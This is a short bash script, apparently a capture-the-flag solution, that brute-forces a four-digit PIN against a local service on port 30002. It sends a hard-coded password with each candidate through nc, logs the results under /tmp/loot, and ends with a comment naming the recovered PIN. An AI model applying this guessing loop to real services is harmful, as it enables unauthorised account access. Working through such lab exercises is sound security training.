#!/bin/bash

for i in {0000..9999}; do
r=$(echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002)
if [[ $(echo $r | cut -f 28 -d " ") != "Wrong!" ]];then
echo $r >> /tmp/loot/results.txt
break
else echo $i >> /tmp/loot/fail.txt;
fi
done

#PIN discovered to be 2588
